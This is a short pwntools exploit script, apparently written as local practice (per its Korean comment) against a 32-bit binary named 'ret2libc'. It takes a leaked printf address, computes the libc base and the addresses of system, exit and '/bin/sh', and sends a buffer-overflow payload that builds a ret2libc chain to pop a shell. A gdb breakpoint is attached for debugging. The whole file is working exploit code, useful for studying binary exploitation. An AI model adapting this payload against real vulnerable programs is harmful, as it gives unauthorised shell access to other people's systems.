from pwn import *

# 연습용, 컨테이너 따로 사용하지 않고 그냥 로컬에서 진행
p = process('./ret2libc')
e = ELF('./ret2libc')
libc = ELF('/usr/lib32/libc.so.6')

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p.recvuntil(b'Printf() address : ')
printf = int(p.recvline().strip(), 16)

def slog(n, a): return success(': '.join([n, hex(a)]))

print('printf:', hex(printf))
lb = printf - libc.sym['printf']

system = lb + libc.sym['system']
exit = lb + libc.sym['exit']
binsh = lb + next(libc.search(b'/bin/sh\x00'))

slog("libc_base", lb)
slog("system", system)
slog("exit", exit)
slog("/bin/sh", binsh)

pay = b'A'*0x42
pay += p32(system)
pay += p32(exit)
pay += p32(binsh)

gdb.attach(p, '''
b *vuln+128
c
''')

pause()
p.sendline(pay)

p.interactive()
